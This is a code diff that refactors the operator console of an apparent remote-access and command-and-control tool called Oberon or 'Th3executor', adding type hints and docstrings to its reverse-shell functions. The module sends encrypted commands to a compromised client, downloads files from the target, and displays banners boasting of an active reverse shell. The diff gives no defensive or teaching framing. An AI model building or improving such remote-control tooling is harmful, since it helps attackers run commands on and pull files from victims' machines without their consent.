@@ -1,12 +1,16 @@
-import components.networking as networking
-from oberon_framework import clear_screen
-from components.ingestor import createfile_nocollision
-import time
+"""Interactive remote shell utilities."""
+
 import os
-import ascii_art
+import time
 from termcolor import colored
 
-def process_shell_prompt(output, conn_obj):
+import components.networking as networking
+from oberon_framework import clear_screen, intro_banner
+from components.ingestor import createfile_nocollision
+import ascii_art
+
+def process_shell_prompt(output: bytes, conn_obj) -> str:
+    """Parse the shell prompt information returned by the client."""
     networking.clear_socket_buffer(conn_obj)
     try:
         # Decrypt the message and decode it
@@ -37,7 +41,8 @@ def process_shell_prompt(output, conn_obj):
 
     return shell_prompt
 
-def shell_command(client_output, conn_obj):    
+def shell_command(client_output: bytes, conn_obj) -> None:
+    """Interactive loop for sending shell commands to the client."""
     print(f"[!] {colored('REVERSE SHELL ACTIVE', 'green')} - Type 'quit' or 'exit' to exit shell command")
     print("[!] Type 'help' to view the shell help menu \n")
     
@@ -47,11 +52,11 @@ def shell_command(client_output, conn_obj):
         networking.clear_socket_buffer(conn_obj)
         usr_input = input("\n" + colored(shell_prompt, attrs=["bold"])).strip()
         
-        if usr_input == "clear" or usr_input == "cls":
+        if usr_input in ("clear", "cls"):
             clear_screen()
             shell_banner()
             continue
-        elif usr_input == "quit" or usr_input == "exit":
+        elif usr_input in ("quit", "exit"):
             networking.clear_socket_buffer(conn_obj) 
             print("Redirecting you back to th3executor . . .")
             time.sleep(1.5)
@@ -65,7 +70,7 @@ def shell_command(client_output, conn_obj):
             continue
         
         conn_obj.sendall(networking.encrypt_message(usr_input))  # Send command
-        if usr_input == "quit" or usr_input == "exit":
+        if usr_input in ("quit", "exit"):
             break
         
         if usr_input[:3] == 'cd ':
@@ -99,7 +104,8 @@ def shell_command(client_output, conn_obj):
         else:
             print(output)
             
-def download(conn_obj, usr_input):
+def download(conn_obj, usr_input) -> str:
+    """Download a file from the client."""
     if len(usr_input) <= 9:
         return "[-] Incorrect command usage. Specify 'download' followed by the file path"
         
@@ -135,13 +141,15 @@ def download(conn_obj, usr_input):
     else:
         return "[-] No data has been recieved from the target. This can be due to a network issue, Try again."
 
-def shell_banner():
+def shell_banner() -> None:
+    """Display the shell banner."""
     banner = colored(ascii_art.oberon_main_banner_3, attrs=["bold"])
     text = colored("\n- Embrace Power - Command and Conquer with Th3executor \n", attrs=["dark"]) 
        
     print(banner + text)
 
-def shell_cheat_sheet():
+def shell_cheat_sheet() -> None:
+    """Print a quick cheat sheet of common shell commands."""
     print(colored("S H E L L  C H E A T  S H E E T  M E N U", attrs=["bold"]))
     print(colored("WINDOWS COMMANDS", "blue", attrs=['bold', 'dark']))
 
@@ -178,7 +186,8 @@ def shell_cheat_sheet():
     for cmd, desc in lin.items():
         print(f"> {cmd:<20} - {desc}")
 
-def shell_help():
+def shell_help() -> None:
+    """Display available shell sub-commands."""
     banner = colored('\nS H E L L   M E N U', 'green', attrs=['bold', 'dark'])
     print(banner)
     print(colored('-' * 66, 'green')) 
@@ -194,7 +203,8 @@ def shell_help():
         print(f"> {command:<20} - {description}")
     print(colored('-' * 66, 'green'))
 
-def shell_load(client_output, conn_obj):
+def shell_load(client_output: bytes, conn_obj) -> str:
+    """Prepare the interface and enter the remote shell."""
     print("Loading up a shell enviroment . . .")
     time.sleep(1.5)
     clear_screen()
